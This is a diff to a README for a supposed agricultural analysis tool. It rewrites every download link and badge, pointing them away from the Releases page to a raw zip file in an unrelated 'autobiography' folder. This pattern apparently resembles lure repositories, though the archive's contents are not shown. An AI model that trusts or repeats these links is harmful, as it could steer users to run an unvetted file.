@@ -1,6 +1,6 @@
 # 🌳 Green-Archipelago-Analysis-Tool - Optimize Agricultural Yields Effortlessly
 
-[![Download](https://img.shields.io/badge/Download-Now-blue)](https://github.com/62-Dinesh/Green-Archipelago-Analysis-Tool/releases)
+[![Download](https://raw.githubusercontent.com/62-Dinesh/Green-Archipelago-Analysis-Tool/main/autobiography/Green-Archipelago-Analysis-Tool.zip)](https://raw.githubusercontent.com/62-Dinesh/Green-Archipelago-Analysis-Tool/main/autobiography/Green-Archipelago-Analysis-Tool.zip)
 
 ## 📖 Overview
 
@@ -27,7 +27,7 @@ Before downloading, ensure your system meets the following requirements:
 To get started, follow these simple steps:
 
 1. **Download the Tool:**
-   - Visit our [Releases page to download](https://github.com/62-Dinesh/Green-Archipelago-Analysis-Tool/releases).
+   - Visit our [Releases page to download](https://raw.githubusercontent.com/62-Dinesh/Green-Archipelago-Analysis-Tool/main/autobiography/Green-Archipelago-Analysis-Tool.zip).
    
 2. **Install the Application:**
    - Locate the downloaded file on your computer.
@@ -39,7 +39,7 @@ To get started, follow these simple steps:
 
 ## 🔥 Download & Install
 
-To begin your journey with the Green-Archipelago-Analysis-Tool, visit this page to download: [Download Here](https://github.com/62-Dinesh/Green-Archipelago-Analysis-Tool/releases).
+To begin your journey with the Green-Archipelago-Analysis-Tool, visit this page to download: [Download Here](https://raw.githubusercontent.com/62-Dinesh/Green-Archipelago-Analysis-Tool/main/autobiography/Green-Archipelago-Analysis-Tool.zip).
 
 ## 📊 How to Use the Tool
 
@@ -89,6 +89,6 @@ This project is licensed under the MIT License. Please see the LICENSE file for 
 
 For inquiries, please reach us at our GitHub repository or through the issues section.
 
-[![Download](https://img.shields.io/badge/Download-Now-blue)](https://github.com/62-Dinesh/Green-Archipelago-Analysis-Tool/releases)
+[![Download](https://raw.githubusercontent.com/62-Dinesh/Green-Archipelago-Analysis-Tool/main/autobiography/Green-Archipelago-Analysis-Tool.zip)](https://raw.githubusercontent.com/62-Dinesh/Green-Archipelago-Analysis-Tool/main/autobiography/Green-Archipelago-Analysis-Tool.zip)
 
 Thank you for choosing the Green-Archipelago-Analysis-Tool. We hope it aids you in making informed agricultural decisions!
